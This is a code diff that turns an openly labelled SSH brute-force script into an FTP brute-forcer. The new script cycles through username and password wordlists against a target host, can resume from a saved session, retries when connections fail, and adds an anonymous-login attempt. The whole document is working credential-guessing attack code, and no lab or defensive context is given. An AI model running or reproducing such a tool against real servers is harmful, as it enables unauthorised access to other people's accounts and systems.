@@ -1,8 +1,8 @@
 #!/usr/bin/python
 
 import sys, pexpect, argparse, os.path
+from ftplib import FTP
 from os import path
-from pexpect import pxssh
 
 def check_session():
     try:
@@ -34,7 +34,7 @@ def restore_session():
         session = open(".session", "r")
         line = session.readline().strip().split(":")
         return int(line[0]), int(line[1])
-    except:
+    except Exception:
         return False
 
 def reset_session():
@@ -46,42 +46,44 @@ def reset_session():
     except:
         return False
 
-def ssh_connect(host, port, usr, pwd):
+def ftp_connect(host, port, usr, pwd):
     try:
-        s = pxssh.pxssh()
-        s.login(host, usr, pwd, port=port)
-        s.sendline('uptime')
-        s.prompt()
-        #print(s.before) # To output any command you like after a successful login
-        s.logout()
+        ftp = FTP()
+        ftp.connect(host, port, timeout=10)
+        ftp.login(usr, pwd)
+        ftp.quit()
         return 0
     except Exception as e:
         err = str(e)
-        if "password refused" in err:
+        if "incorrect" in err:
             return 1
-        elif "establish connection" in err:
+        elif "established connection failed" in err:
             return 2
         else:
-            print("Unknown error: ", err)
+            print(err)
             return 3
-        
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--host", help="The host you want to perform bruteforce attack", type=str, required=True)
-    parser.add_argument("--port", help="The port you want to perform bruteforce attack. Leave empty to use port 22.", type=str, required=False)
+    parser.add_argument("--port", help="The port you want to perform bruteforce attack. Leave empty to use port 21.", type=str, required=False)
     parser.add_argument("--usr", help="The wordlist path containing usernames", type=str, required=True)
     parser.add_argument("--pwd", help="The wordlist path containing passwords", type=str, required=True)
     parser.add_argument("--rst", help="Flag to reset your session file", action="store_true", required=False)
+    parser.add_argument("--anon", help="Flag to try logging in anonymously too", action="store_true", required=False)
     
     args = parser.parse_args()
     host = args.host
     usr = args.usr
     pwd = args.pwd
     rst = args.rst
+    anon = args.anon
 
-    port = 22
+    port = 21
     if args.port != None:
         port = int(args.port)
+
+    print("Using port %d" % port)
 
     if not path.exists(usr):
         print("Username file path does not exist.")
@@ -101,6 +103,13 @@ def main():
         
     if rst:
         reset_session()
+
+    if anon:
+        print("Trying anonymous login...")
+        if ftp_connect(host, port, "anonymous", "anonymous") == 0:
+            print("Successfully found: anonymous:anonymous")
+        else:
+            print("Failed to login anonymously.")
     
     done = False
     pos_usr = 1
@@ -137,7 +146,7 @@ def main():
             tmp_usr = u.strip()
             tmp_pwd = p.strip()
             print("Trying: ", tmp_usr + ":" + tmp_pwd)
-            result = ssh_connect(host, port, tmp_usr, tmp_pwd)
+            result = ftp_connect(host, port, tmp_usr, tmp_pwd)
             if result == 0:
                 print("Successfully found: %s:%s" % (tmp_usr, tmp_pwd))
                 done = True
@@ -145,7 +154,7 @@ def main():
             elif  result == 2:
                 while True:
                     print("Could not establish connection. Retrying...")
-                    result = ssh_connect(host, port, tmp_usr, tmp_pwd)
+                    result = ftp_connect(host, port, tmp_usr, tmp_pwd)
                     if result == 0:
                         print("Successfully found: %s:%s" % (tmp_usr, tmp_pwd))
                         done = True
